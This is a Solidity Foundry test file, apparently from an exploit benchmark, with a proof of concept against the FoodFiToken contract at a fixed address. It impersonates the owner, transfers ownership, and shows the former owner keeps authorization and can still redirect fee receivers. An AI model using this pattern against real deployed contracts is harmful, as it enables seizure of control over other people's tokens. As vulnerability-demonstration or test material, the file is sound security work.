// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IFoodFiToken {
    function owner() external view returns (address);
    function transferOwnership(address payable adr) external;
    function isAuthorized(address adr) external view returns (bool);
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _devFeeReceiver) external;
    function authorizations(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x100F770A25Af4c2ec5f3DAdF47A329b2abaA8eEf;
    address attacker = address(this);
    address private newOwner = address(0x123);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use the existing TARGET contract
        vm.label(newOwner, "New Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Get current owner address
        address currentOwner = IFoodFiToken(TARGET).owner();

        // Step 2: Impersonate current owner and transfer ownership
        vm.startPrank(currentOwner);
        IFoodFiToken(TARGET).transferOwnership(payable(newOwner));
        vm.stopPrank();

        // Step 3: Verify ownership was transferred
        address updatedOwner = IFoodFiToken(TARGET).owner();
        require(updatedOwner == newOwner, "Ownership not transferred");

        // Step 4: Verify previous owner is still authorized
        bool isStillAuthorized = IFoodFiToken(TARGET).isAuthorized(currentOwner);
        require(isStillAuthorized, "Previous owner should still be authorized");

        // Step 5: Demonstrate unauthorized access by calling setFeeReceivers from previous owner
        vm.prank(currentOwner);
        IFoodFiToken(TARGET).setFeeReceivers(address(0x456), address(0x789), address(0xabc));

        // The oracle will check authorizations[currentOwner] == true
        // This should pass because the vulnerability leaves the previous owner authorized
        bool isAuthorized = IFoodFiToken(TARGET).authorizations(currentOwner);
        assertEq(isAuthorized, true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

